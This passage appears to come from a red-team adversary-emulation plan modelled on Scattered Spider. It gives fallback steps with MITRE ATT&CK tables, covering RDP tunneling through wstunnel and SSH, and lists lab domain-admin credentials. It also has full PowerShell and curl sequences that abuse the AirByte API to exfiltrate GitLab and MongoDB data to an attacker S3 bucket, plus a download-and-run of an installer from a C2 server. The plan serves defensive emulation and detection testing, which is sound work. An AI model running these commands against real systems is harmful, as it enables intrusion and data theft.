| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows, IaaS | - | Calibrated - Not Benign | Scattered Spider downloads Tactical RMM on all available hosts | redkeep (10.55.3.100), sept (10.55.3.101), dragongate (10.55.3.104), fleabottom (10.55.4.101), fishmonger (10.55.4.102) | nt authority\system | [TacticalRMM](../Resources/rmmagent) | crowdstrike_analysis, [8]
| Command and Control | T1219 | Remote Access Software | Windows | - | Calibrated - Not Benign | Scattered Spider installs Tactical RMM on all available hosts | redkeep (10.55.3.100), sept (10.55.3.101), dragongate (10.55.3.104), fleabottom (10.55.4.101), fishmonger (10.55.4.102) | nt authority\system | [TacticalRMM](../Resources/rmmagent) | crowdstrike_analysis, [6]

## Step 6 - wstunnel successful but TacticalRMM fails to download/install/connect

### Voice Track

If wstunnel ran successfully but TacticalRMM fails to download/install/connect,
use the following alternative step to continue execution.

### Procedures

- ☣️ Return to the EC2 Serial Console connection to the newly created EC2
instance. CTRL + C to kill the SSH tunnel created by the `wstunnel` client.
Execute the `wstunnel` client with new arguments to establish an RDP tunnel to
`fishmonger (10.55.4.102)`

  ```bash
  ./wstunnel client -R tcp://12.78.0.94:2222:10.55.4.102:3389 wss://12.78.0.94:443
  ```

- ☣️ Return to the Jumpbox host `jumpbox (12.78.110.37)` and initiate an RDP
session to `12.78.0.94:2222`. Depending on the point of failure for Tactical
RMM, this may disconnect the legitimate RDP initiated from the jumpbox.

  | Destination | Username | Password
  |  - | - | -
  | 12.78.0.94:2222 | atargaryen | Graph-Frozen

- ☣️ Return to the main scenario using the RDP session in place of TacticalRMM.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1572 | Protocol Tunneling | Windows, Linux | - | Calibrated - Not Benign | Scattered Spider executes wstunnel client on created EC2 instance to establish RDP tunnel to `fishmonger (10.55.4.102)` | fishmonger (10.55.4.102) | kingslanding\ahightower | - | [5], [6]
| Command and Control | T1572 | Protocol Tunneling | Windows, Linux | - | Calibrated - Not Benign | Scattered Spider connects to wstunnel and tunnels RDP through created EC2 instance to `fishmonger (10.55.4.102)` | fishmonger (10.55.4.102) | ahightower | - | [5], [6]
| Lateral Movement | T1021.001 | Remote Services: Remote Desktop Protocol | Windows | - | Calibrated - Not Benign | Scattered Spider accesses remote host fishmonger (10.55.4.102) using RDP | fishmonger (10.55.4.102) | atargaryen | - | [8]

## Step 6 - wstunnel and Tactical RMM fail

### Voice Track

If both wstunnel and Tactical RMM fail, use the following alternative step to
continue execution.

### Procedures

- ☣️ From the Jumpbox host `jumpbox (12.78.110.37)`, open Notepad, copy the SSH
key from Step 4 from Kali into Notepad, and save it as `id_rsa` in the `.ssh`
folder. Double check that it has an empty line at the bottom, and that the file
saved without an extension. Then, open a new PowerShell window and execute an
SSH tunnel through the created EC2 instance to `fishmonger (10.55.4.102)`,
replacing `10.212.3.108` with the IP address of the created EC2 instance.

  ```bash
  ssh -L 2222:10.55.4.102:3389 ubuntu@10.212.3.108
  ```

- ☣️ From the Jumpbox host `jumpbox (12.78.110.37)`, initiate an RDP session to
`127.0.0.1:2222` supplying the domain admin's credentials. Depending on the
point of failure for Tactical RMM, this may disconnect the legitimate RDP
initiated from the jumpbox.

  | Destination | Username | Password
  |  - | - | -
  | 127.0.0.1:2222 | kingslanding\atargaryen | Graph-Frozen

- ☣️ Return to the main scenario using the RDP session in place of TacticalRMM.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1572 | Protocol Tunneling | Windows, Linux | - | Calibrated - Not Benign | Scattered Spider uses SSH to tunnel RDP through the created EC2 instance to `fishmonger (10.55.4.102)` | fishmonger (10.55.4.102) | atargaryen | - | [5], [6]
| Command and Control | T1572 | Protocol Tunneling | Windows, Linux | - | Calibrated - Not Benign | Scattered Spider connects to SSH tunnel and tunnels RDP through created EC2 instance to `fishmonger (10.55.4.102)` | fishmonger (10.55.4.102) | atargaryen | - | [5], [6]
| Lateral Movement | T1021.001 | Remote Services: Remote Desktop Protocol | Windows | - | Calibrated - Not Benign | Scattered Spider accesses remote host `fishmonger (10.55.4.102)` using RDP | fishmonger (10.55.4.102) | atargaryen | - | [8]

## Step 7 - Failure to Set New AirByte Destination via GUI

### Voice Track

If adding a new AirByte destination via GUI fails, perform the following
alternative steps to add a new destination using the AirByte API.

### Procedures

- ☣️ Return to your terminal in Kali and obtain the attacker S3 access and
secret access keys

- ☣️ From the Tactical RMM session, open an admin PowerShell prompt if one does
not already exist, and execute the following commands to create a new
destination in AirByte that points to the adversary-controlled S3 bucket. Make
sure to update the command with IDs, secrets and keys where necessary.

  ```psh
  $accessToken = $(curl.exe -s -X POST http://rookery.kingslanding.net/api/v1/applications/token -H "Content-Type: application/json" --data '{\"client_id\": \"fa51ae53-3b3c-4527-a6c0-b10acd8bfc23\",\"client_secret\": \"MsyvIBHX6uuQEPVuDLSzMVd6r8I5UV7F\",\"grant-type\":\"client_credentials\"}' | ConvertFrom-Json).access_token;
  $workspaceId = $($(curl.exe -s http://rookery.kingslanding.net/api/public/v1/workspaces -H "Authorization: Bearer $accessToken" | ConvertFrom-Json).data | ?{ $_.name -eq "Default Workspace" } | Select-Object -First 1).workspaceId;
  $destData = '{\"configuration\": {\"destinationType\": \"s3\",\"access_key_id\": \"REPLACE_WITH_ATTACKER_S3_ACCESS_KEY\",\"secret_access_key\": \"<REPLACE_WITH_ATTACKER_S3_SECRET_ACCESS_KEY>\",\"s3_bucket_name\": \"REPLACE_WITH_ATTACKER_S3_BUCKET_NAME\",\"s3_bucket_path\": \"databackup\",\"s3_bucket_region\": \"us-east-1\",\"format\": {\"format_type\": \"CSV\",\"flattening\": \"No flattening\",\"compression\": {\"compression_type\": \"No Compression\"}}},\"name\":\"Weekly backup\",\"workspaceId\":\"' + $workspaceId + '\"}';
  $result = $(curl.exe -s -X POST http://rookery.kingslanding.net/api/public/v1/destinations -H "Authorization: Bearer $accessToken" -H "Content-Type: application/json" -H "accept: application/json" --data "$destData" | ConvertFrom-Json | ConvertTo-Json -Depth 10);
  $result
  ```

  - ***Expected Output***

    ```text
    {
     "destinationId":  "ddb72a1c-a03f-459d-b3b0-bb515a18525f",
     "name":  "Weekly backup",
     "destinationType":  "s3",
     "workspaceId":  "5ff07c70-0ae8-4c84-bfcf-75c60a52b446",
     "configuration":  {
      "format":  {
       "flattening":  "No flattening",
       "compression":  "@{compression_type=No Compression}",
       "format_type":  "CSV"
      },
      "access_key_id":  "**********",
      "s3_bucket_name":  "oldtown-backup-storage",
      "s3_bucket_path":  "databackup",
      "s3_bucket_region":  "us-east-1",
      "secret_access_key":  "**********"
     }
    }
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Defense Evasion | T1078.004 | Valid Accounts: Cloud Accounts | Windows, IaaS | - | Calibrated - Not Benign | Scattered Spider authenticates with AWS Access Key for S3 | fishmonger (10.55.4.102) | atargaryen | - | [7]

## Step 7 - Failure to Create New AirByte GitLab Connection via GUI

### Voice Track

If creating a new AirByte connection for GitLab via GUI fails, perform the
following alternative steps to add a new connection using the AirByte API.

### Procedures

- ☣️ From the Tactical RMM session, open an admin PowerShell prompt if one does
not already exist, and execute the following commands to create a new GitLab
connection in AirByte.

  ```psh
  $accessToken = $(curl.exe -s -X POST http://rookery.kingslanding.net/api/v1/applications/token -H "Content-Type: application/json" --data '{\"client_id\": \"fa51ae53-3b3c-4527-a6c0-b10acd8bfc23\",\"client_secret\": \"MsyvIBHX6uuQEPVuDLSzMVd6r8I5UV7F\",\"grant-type\":\"client_credentials\"}' | ConvertFrom-Json).access_token; $gitlabStreams = @('branches', 'commits', 'deployments', 'group_issue_boards', 'group_labels', 'group_members', 'group_milestones', 'groups', 'issues', 'jobs', 'merge_request_commits', 'merge_requests', 'pipelines', 'pipelines_extended', 'project_labels', 'project_milestones', 'projects', 'releases', 'tags', 'users'); $streams = '';foreach ($stream in $gitlabStreams) { $streams += "{\`"name\`": \`"$stream\`",\`"syncMode\`": \`"full_refresh_overwrite\`"}," }; $streams = $streams.TrimEnd(','); $workspaceId = $($(curl.exe -s http://rookery.kingslanding.net/api/public/v1/workspaces -H "Authorization: Bearer $accessToken" | ConvertFrom-Json).data | ?{ $_.name -eq "Default Workspace" } | Select-Object -First 1).workspaceId; $destinationId = $($(curl.exe -s "http://rookery.kingslanding.net/api/public/v1/destinations?workspaceIds=$workspaceId" -H "Authorization: Bearer $accessToken" | ConvertFrom-Json).data | ?{ $_.name -eq "S3" } | Select-Object -First 1).destinationId; $sourceId = $($(curl.exe -s "http://rookery.kingslanding.net/api/public/v1/sources?workspaceIds=$workspaceId" -H "Authorization: Bearer $accessToken" | ConvertFrom-Json).data | ?{ $_.name -eq "gitlab-internal" } | Select-Object -First 1).sourceId; $destData = '{\"name\": \"Gitlab to S3\",\"sourceId\": \"' + $sourceId + '\",\"destinationId\": \"' + $destinationId + '\",\"configurations\": {\"streams\": [' + $streams + ']},\"schedule\": {\"scheduleType\": \"manual\"},\"nonBreakingSchemaUpdatesBehavior\": \"propagate_columns\",\"namespaceDefinition\": \"destination\"}'; $result = $(curl.exe -s -X POST http://rookery.kingslanding.net/api/public/v1/connections -H "Authorization: Bearer $accessToken" -H "Content-Type: application/json" -H "accept: application/json" --data "$destData" | ConvertFrom-Json); $result | ConvertTo-Json -Depth 10
  ```

  - ***Expected Output***

    ```text
    {
     "connectionId":  "86f80447-decb-44ef-b81d-183120b69c4c",
     "name":  "Gitlab to S3",
     "sourceId":  "61a3ba95-e3d8-441f-b3b6-26c16c352499",
     "destinationId":  "ddb72a1c-a03f-459d-b3b0-bb515a18525f",
     "workspaceId":  "5ff07c70-0ae8-4c84-bfcf-75c60a52b446",
     "status":  "active",
     "schedule":  {
      "scheduleType":  "manual"
     },
     "dataResidency":  "auto",
     "configurations":  {
      "streams":  [
       {
        "name":  "gitlabstream_CHANGEME",
        "syncMode":  "full_refresh_overwrite",
        "cursorField":  [],
        "primaryKey":  []
       }
      ]
     },
     "nonBreakingSchemaUpdatesBehavior":  "propagate_columns",
     "namespaceDefinition":  "destination"
    }
    ```

- ☣️ In the same PowerShell prompt, execute the following commands to sync the
GitLab connection and exfiltrate the data.

  ```psh
  $connectionId = $result.connectionId; $accessToken = $(curl.exe -s -X POST http://rookery.kingslanding.net/api/v1/applications/token -H "Content-Type: application/json" --data '{\"client_id\": \"fa51ae53-3b3c-4527-a6c0-b10acd8bfc23\",\"client_secret\": \"MsyvIBHX6uuQEPVuDLSzMVd6r8I5UV7F\",\"grant-type\":\"client_credentials\"}' | ConvertFrom-Json).access_token; $destData = '{\"jobType\": \"sync\",\"connectionId\": \"' + $connectionId + '\"}';
  $startSyncResult = $(curl.exe -s -X POST http://rookery.kingslanding.net/api/public/v1/jobs -H "Authorization: Bearer $accessToken" -H "Content-Type: application/json" -H "accept: application/json" --data "$destData" | ConvertFrom-Json | ConvertTo-Json -Depth 10); $startSyncResult
  ```

  - ***Expected Output***

    ```text
    {
     "jobId":  4,
     "status":  "running",
     "jobType":  "sync",
     "startTime":  "2024-11-18T19:22:44Z",
     "connectionId":  "86f80447-decb-44ef-b81d-183120b69c4c",
     "duration":  "PT1S"
    }
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Collection | T1213.003 | Data from Information Repositories: Code Repositories | Windows, Linux, SaaS | - | Calibrated - Not Benign | Scattered Spider uses Airbyte to exfiltrate GitLab data | fishmonger (10.55.4.102), rookery (10.212.3.107), guildhall (10.212.3.106) | atargaryen | - | [5], [11]
| Exfiltration | T1567.002 | Exfiltration Over Web Services: Exfiltration to Cloud Storage | Windows, Linux, SaaS | - | Calibrated - Not Benign | Scattered Spider exfiltrates GitLab data to attacker S3 bucket | fishmonger (10.55.4.102), rookery (10.212.3.107), guildhall (10.212.3.106) | atargaryen | - | [5], [11]

## Step 7 - Failure to Create New MongoDB Connection via GUI

### Voice Track

If creating a new AirByte connection for MongoDB via GUI fails, perform the
following alternative steps to add a new connection using the AirByte API.

### Procedures

- ☣️ From the Tactical RMM session, open an admin PowerShell prompt if one does
not already exist, and execute the following commands to create a new MongoDB
connection in AirByte.

  ```psh
  $accessToken = $(curl.exe -s -X POST http://rookery.kingslanding.net/api/v1/applications/token -H "Content-Type: application/json" --data '{\"client_id\": \"fa51ae53-3b3c-4527-a6c0-b10acd8bfc23\",\"client_secret\": \"MsyvIBHX6uuQEPVuDLSzMVd6r8I5UV7F\",\"grant-type\":\"client_credentials\"}' | ConvertFrom-Json).access_token; $mongoStreams = @('__pre_attachments', '__pre_avatars', 'accessibilitySettings', 'accountSettings', 'actions', 'activities', 'announcements', 'attachments', 'boards', 'card_comment_reactions', 'card_comments', 'cards', 'checklistItems', 'checklists', 'cronHistory', 'customFields', 'integrations', 'invitation_codes', 'lists', 'meteor-migrations', 'meteor_accounts_loginServiceConfiguration', 'meteor_oauth_pendingCredentials', 'org', 'orgUser', 'rules', 'sessiondata', 'settings', 'swimlanes', 'tableVisibilityModeSettings', 'team', 'translation', 'triggers', 'unsaved-edits', 'users'); $streams = ''; foreach ($stream in $mongoStreams) { $streams += "{\`"name\`": \`"$stream\`",\`"syncMode\`": \`"full_refresh_overwrite\`"}," }; $streams = $streams.TrimEnd(','); $workspaceId = $($(curl.exe -s http://rookery.kingslanding.net/api/public/v1/workspaces -H "Authorization: Bearer $accessToken" | ConvertFrom-Json).data | ?{ $_.name -eq "Default Workspace" } | Select-Object -First 1).workspaceId; $destinationId = $($(curl.exe -s "http://rookery.kingslanding.net/api/public/v1/destinations?workspaceIds=$workspaceId" -H "Authorization: Bearer $accessToken" | ConvertFrom-Json).data | ?{ $_.name -eq "S3" } | Select-Object -First 1).destinationId; $sourceId = $($(curl.exe -s "http://rookery.kingslanding.net/api/public/v1/sources?workspaceIds=$workspaceId" -H "Authorization: Bearer $accessToken" | ConvertFrom-Json).data | ?{ $_.name -eq "mongo-legacy" } | Select-Object -First 1).sourceId; $destData = '{\"name\": \"Wekans to S3\",\"sourceId\": \"' + $sourceId + '\",\"destinationId\": \"' + $destinationId + '\",\"configurations\": {\"streams\": [' + $streams + ']},\"schedule\": {\"scheduleType\": \"manual\"},\"nonBreakingSchemaUpdatesBehavior\": \"propagate_columns\",\"namespaceDefinition\": \"destination\"}'; $result = $(curl.exe -s -X POST http://rookery.kingslanding.net/api/public/v1/connections -H "Authorization: Bearer $accessToken" -H "Content-Type: application/json" -H "accept: application/json" --data "$destData" | ConvertFrom-Json); $result | ConvertTo-Json -Depth 10
  ```

  - ***Expected Output***

    ```text
    {
     "connectionId":  "86f80447-decb-44ef-b81d-183120b69c4c",
     "name":  "Wekans to S3",
     "sourceId":  "61a3ba95-e3d8-441f-b3b6-26c16c352499",
     "destinationId":  "ddb72a1c-a03f-459d-b3b0-bb515a18525f",
     "workspaceId":  "5ff07c70-0ae8-4c84-bfcf-75c60a52b446",
     "status":  "active",
     "schedule":  {
      "scheduleType":  "manual"
     },
     "dataResidency":  "auto",
     "configurations":  {
      "streams":  [
       {
        "name":  "mongodb_streamCHANGEME",
        "syncMode":  "full_refresh_overwrite",
        "cursorField":  [],
        "primaryKey":  []
       }
      ]
     },
     "nonBreakingSchemaUpdatesBehavior":  "propagate_columns",
     "namespaceDefinition":  "destination"
    }
    ```

- ☣️ In the same PowerShell prompt, execute the following commands to sync the
MongoDB connection and exfiltrate the data.

  ```psh
  $connectionId = $result.connectionId; $accessToken = $(curl.exe -s -X POST http://rookery.kingslanding.net/api/v1/applications/token -H "Content-Type: application/json" --data '{\"client_id\": \"fa51ae53-3b3c-4527-a6c0-b10acd8bfc23\",\"client_secret\": \"MsyvIBHX6uuQEPVuDLSzMVd6r8I5UV7F\",\"grant-type\":\"client_credentials\"}' | ConvertFrom-Json).access_token; $destData = '{\"jobType\": \"sync\",\"connectionId\": \"' + $connectionId + '\"}'; $startSyncResult = $(curl.exe -s -X POST http://rookery.kingslanding.net/api/public/v1/jobs -H "Authorization: Bearer $accessToken" -H "Content-Type: application/json" -H "accept: application/json" --data "$destData" | ConvertFrom-Json | ConvertTo-Json -Depth 10); $startSyncResult
  ```

  - ***Expected Output***

    ```text
    {
     "jobId":  4,
     "status":  "running",
     "jobType":  "sync",
     "startTime":  "2024-11-18T19:22:44Z",
     "connectionId":  "86f80447-decb-44ef-b81d-183120b69c4c",
     "duration":  "PT1S"
    }
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Collection | T1213 | Data from Information Repositories | Windows, Linux, IaaS, SaaS | - | Calibrated - Not Benign | Scattered Spider uses Airbyte to exfiltrate Wekan data | fishmonger (10.55.4.102), rookery (10.212.3.107), dragonpit (10.212.3.105) | atargaryen | - | [6], [5], [11]
| Exfiltration | T1567.002 | Exfiltration Over Web Services: Exfiltration to Cloud Storage | Windows, Linux | - | Calibrated - Not Benign | Scattered Spider exfiltrates Wekan data to attacker S3 bucket | fishmonger (10.55.4.102), rookery (10.212.3.107), dragonpit (10.212.3.105) | atargaryen | - | [6], [5], [11]

## Step 7 - CyberDuck Installer Download Fails

### Voice Track

If the CyberDuck installer fails to download, perform the following alternative
steps.

### Procedures

- ☣️ From the Tactical RMM session, open an admin PowerShell prompt if one does
not already exist, and execute the following commands to download the CyberDuck
installer from the C2 server and install CyberDuck.

  ```psh
  curl http://174.3.0.70/files/cyberduck_installer.exe -O cyberduck_installer.exe; .\cyberduck_installer.exe
  ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | - | Calibrated - Not Benign | Scattered Spider downloads and installs Cyberduck | fishmonger (10.55.4.102) | atargaryen | - | [7], [8]

## Step 7 - CyberDuck Fails to Enumerate S3 Bucket Contents

### Voice Track

There are currently no alternative steps available for this step.

## Step 7 - CyberDuck Fails to Exfiltrate S3 Bucket Contents

### Voice Track

There are currently no alternative steps available for this step.

## Step 7 - Outlook Email Forwarding Fails

### Voice Track

There are currently no alternative steps in the event that the operator fails to
forward victim emails to the adversary email.

## Step 7 - CyberDuck Fails to Exfitrate File Share Contents

### Voice Track

There are currently no alternative steps available for this step.
